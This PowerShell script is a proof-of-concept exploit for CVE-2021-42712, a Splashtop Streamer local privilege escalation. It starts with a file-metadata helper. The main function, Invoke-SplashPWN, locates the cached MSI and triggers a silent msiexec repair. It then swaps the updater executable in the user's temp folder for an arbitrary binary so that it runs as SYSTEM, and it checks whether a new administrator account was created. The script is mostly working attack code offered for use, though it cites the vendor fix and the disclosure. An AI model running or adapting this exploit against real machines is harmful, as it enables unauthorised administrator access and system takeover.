function Get-FileMetaData {
    <#
    .SYNOPSIS
    Get metadata information from a file

    .DESCRIPTION
    Small function that gets metadata information from file providing similar output to what Explorer shows when viewing file

    .PARAMETER File
    FileName or FileObject

    .EXAMPLE
    Get-ChildItem -Path $Env:USERPROFILE\Desktop -Force | Get-FileMetaData | Out-HtmlView -ScrollX -Filtering -AllProperties

    .EXAMPLE
    Get-ChildItem -Path $Env:USERPROFILE\Desktop -Force | Where-Object { $_.Attributes -like '*Hidden*' } | Get-FileMetaData | Out-HtmlView -ScrollX -Filtering -AllProperties

    .NOTES
    Source: https://evotec.xyz/getting-file-metadata-with-powershell-similar-to-what-windows-explorer-provides/
    #>
    [CmdletBinding()]
    param (
        [Parameter(Position = 0, ValueFromPipeline)][Object] $File,
        [switch] $Signature
    )
    Process {
        foreach ($F in $File) {
            $MetaDataObject = [ordered] @{}
            if ($F -is [string]) {
                $FileInformation = Get-ItemProperty -Path $F
            } elseif ($F -is [System.IO.DirectoryInfo]) {
                #Write-Warning "Get-FileMetaData - Directories are not supported. Skipping $F."
                continue
            } elseif ($F -is [System.IO.FileInfo]) {
                $FileInformation = $F
            } else {
                Write-Warning "Get-FileMetaData - Only files are supported. Skipping $F."
                continue
            }
            $ShellApplication = New-Object -ComObject Shell.Application
            $ShellFolder = $ShellApplication.Namespace($FileInformation.Directory.FullName)
            $ShellFile = $ShellFolder.ParseName($FileInformation.Name)
            $MetaDataProperties = [ordered] @{}
            0..400 | ForEach-Object -Process {
                $DataValue = $ShellFolder.GetDetailsOf($null, $_)
                $PropertyValue = (Get-Culture).TextInfo.ToTitleCase($DataValue.Trim()).Replace(' ', '')
                if ($PropertyValue -ne '') {
                    $MetaDataProperties["$_"] = $PropertyValue
                }
            }
            foreach ($Key in $MetaDataProperties.Keys) {
                $Property = $MetaDataProperties[$Key]
                $Value = $ShellFolder.GetDetailsOf($ShellFile, [int] $Key)
                if ($Property -in 'Attributes', 'Folder', 'Type', 'SpaceFree', 'TotalSize', 'SpaceUsed') {
                    continue
                }
                If (($null -ne $Value) -and ($Value -ne '')) {
                    $MetaDataObject["$Property"] = $Value
                }
            }
            if ($FileInformation.VersionInfo) {
                $SplitInfo = ([string] $FileInformation.VersionInfo).Split([char]13)
                foreach ($Item in $SplitInfo) {
                    $Property = $Item.Split(":").Trim()
                    if ($Property[0] -and $Property[1] -ne '') {
                        $MetaDataObject["$($Property[0])"] = $Property[1]
                    }
                }
            }
            $MetaDataObject["Attributes"] = $FileInformation.Attributes
            $MetaDataObject['IsReadOnly'] = $FileInformation.IsReadOnly
            $MetaDataObject['IsHidden'] = $FileInformation.Attributes -like '*Hidden*'
            $MetaDataObject['IsSystem'] = $FileInformation.Attributes -like '*System*'
            if ($Signature) {
                $DigitalSignature = Get-AuthenticodeSignature -FilePath $FileInformation.Fullname
                $MetaDataObject['SignatureCertificateSubject'] = $DigitalSignature.SignerCertificate.Subject
                $MetaDataObject['SignatureCertificateIssuer'] = $DigitalSignature.SignerCertificate.Issuer
                $MetaDataObject['SignatureCertificateSerialNumber'] = $DigitalSignature.SignerCertificate.SerialNumber
                $MetaDataObject['SignatureCertificateNotBefore'] = $DigitalSignature.SignerCertificate.NotBefore
                $MetaDataObject['SignatureCertificateNotAfter'] = $DigitalSignature.SignerCertificate.NotAfter
                $MetaDataObject['SignatureCertificateThumbprint'] = $DigitalSignature.SignerCertificate.Thumbprint
                $MetaDataObject['SignatureStatus'] = $DigitalSignature.Status
                $MetaDataObject['IsOSBinary'] = $DigitalSignature.IsOSBinary
            }
            [PSCustomObject] $MetaDataObject
        }
    }
}

function Find-SplashtopMSI {
    $Files = Get-ChildItem c:\windows\installer

    foreach ($File in $Files){
        $Subject = Get-FileMetaData -File $File -Signature | select Subject
        if ($Subject -like "*Splashtop Streamer*"){
            return $File
        }
    }
}

function Find-SplashtopGUID {
    $Files = Get-ChildItem c:\windows\installer -Recurse

    foreach ($File in $Files){
        if ($File -like "*ARPPRODUCTICON.exe"){
            $Directory = ($File.DirectoryName).Split("\")[3]
            return $Directory
        }
    }
}

function art {
$art =  
"
      █████████            ████                    █████      ███████████  █████   ███   █████ ██████   █████
     ███░░░░░███          ░░███                   ░░███      ░░███░░░░░███░░███   ░███  ░░███ ░░██████ ░░███ 
    ░███    ░░░  ████████  ░███   ██████    █████  ░███████   ░███    ░███ ░███   ░███   ░███  ░███░███ ░███ 
    ░░█████████ ░░███░░███ ░███  ░░░░░███  ███░░   ░███░░███  ░██████████  ░███   ░███   ░███  ░███░░███░███ 
     ░░░░░░░░███ ░███ ░███ ░███   ███████ ░░█████  ░███ ░███  ░███░░░░░░   ░░███  █████  ███   ░███ ░░██████ 
     ███    ░███ ░███ ░███ ░███  ███░░███  ░░░░███ ░███ ░███  ░███          ░░░█████░█████░    ░███  ░░█████ 
    ░░█████████  ░███████  █████░░████████ ██████  ████ █████ █████           ░░███ ░░███      █████  ░░█████
     ░░░░░░░░░   ░███░░░  ░░░░░  ░░░░░░░░ ░░░░░░  ░░░░ ░░░░░ ░░░░░             ░░░   ░░░      ░░░░░    ░░░░░ 
                 ░███                                                                                        
                 █████                                                                                       
                ░░░░░                                                                                        
    
    Exploit for CVE-2021-42712 discovered by Ronnie Salomonsen
    Written by: Spencer Alessi @techspence
"
$art
}

function Invoke-SplashPWN {
    <#
    .SYNOPSIS
    POC Exploit for CVE-2021-42712 - Splashtop Streamer local privilege escalation vulnerability, discovered by Ronnie Salomonsen.

    .DESCRIPTION
    Splashtop Streamer for Windows contains a local privilege escalation vulnerability prior to version 3.5.0.0
    The installation of the agent uses the Windows Installer framework and an MSI file is cached in c:\windows\installer. 
    An unprivileged user can trigger a repair operation, either by using the Windows Installer API or by running 
    "msiexec.exe /fa c:\windows\installer\[XXXXX].msi".

    Running a repair operation will trigger a number of file operations in the %TEMP% folder of the user triggering the repair. 
    Some of these operations will be performed from a SYSTEM context (started via the Windows Installer service), including the execution of temporary files.

    The issue was fixed in version 3.5.0.0. Update to this version to address the vulnerability.

    .PARAMETER Exepath
    The full path to your executable

    .PARAMETER NewUser
    If your exe creates a new user, this is the user name to check when finished

    .EXAMPLE
    Invoke-SplashPWN -Exepath c:\users\lowprivuser\Desktop\adduser.exe -NewUser splashpwn

    .EXAMPLE
    Invoke-SplashPWN -EXEPath c:\users\lowprivuser\Desktop\HelloWorld.exe

    .NOTES
    https://github.com/mandiant/Vulnerability-Disclosures/blob/master/2022/MNDT-2022-0007/MNDT-2022-0007.md
    https://www.cve.org/CVERecord?id=CVE-2021-42712
    https://support-splashtopbusiness.splashtop.com/hc/en-us/articles/4416188695323-Splashtop-Streamer-version-v3-5-0-0-for-Windows-released-includes-SOS-version-3-5-0-0

    #>
    [CmdletBinding()]
    param(
        [Parameter (Mandatory=$true)]
        $Exepath,
        [Parameter (Mandatory=$false,ParameterSetName = 'NewUser')]
        $NewUser
    )

    if ($VerbosePreference -eq "Continue") {
        $ShowArt = art
        Write-Host $ShowArt -ForegroundColor DarkGreen
        Write-Verbose "[!] Executing SplashPwn, please wait..."
    } else {
        Write-Host "`n[!] Executing SplashPwn, please wait..."
    }

    $SplashtopMSI = Find-SplashtopMSI
    $SplashtopGUID = Find-SplashtopGUID
    $SplashtopTempFolder = "$($env:LOCALAPPDATA)\temp\$SplashtopGUID"

    # initiate a repair of splashtop using msiexec
    Write-Verbose "[i] Starting a repair with msiexec"
    msiexec.exe /fa $SplashtopMSI.FullName /quiet

    # sleep to let msiexec start
    Write-Verbose "[i] Sleeping to let msiexec start"
    Start-Sleep 5

    # replace Splashtop_Software_Updater.exe with our own exe
    Write-Verbose "[i] Overwriting Splashtop_Software_Updater.exe with our own exe"
    Copy-Item -Path $EXEPath -Destination $SplashtopTempFolder\Splashtop_Software_Updater.exe -Force

    # wait for msiexec to finish
    Write-Verbose "[i] Sleep to let msiexec finish"
    Start-Sleep 45

    # Check if our exe ran successfully
    if ($NewUser){
        Write-Verbose "[i] Checking if our new user was created"

        if (Get-LocalUser -Name $NewUser -ErrorAction SilentlyContinue) {
            Write-Verbose "[SUCCESS] - New user was created!"
        } else {
            Write-Host "[ERROR] - New user NOT created"
        }

        $Administrators = Get-LocalGroupMember -Group Administrators | select -ExpandProperty Name
        if ($Administrators -match "splashpwn"){
            Write-Verbose "[SUCCESS] - New user was added to Administrators!"
        } else {
            Write-Host "[ERROR] - New user NOT added to Administrators"
        }
    } else {
        if ($VerbosePreference -eq "Continue") {
            Write-Verbose "[!] NOT creating a new user? Manually check if your exe was sucessful when finished"
        } else {
            Write-Host "[!] NOT creating a new user? Manually check if your exe was sucessful when finished"
        }
    }

    # Cleanup
    Write-Verbose "[i] Cleaning up temp files"

    if ($VerbosePreference -eq "Continue") {
        Write-Verbose "[+] Finished!"
    } else {
        Write-Host "[+] SplashPWN is finished. May the odds be ever in your favor"
    }
}

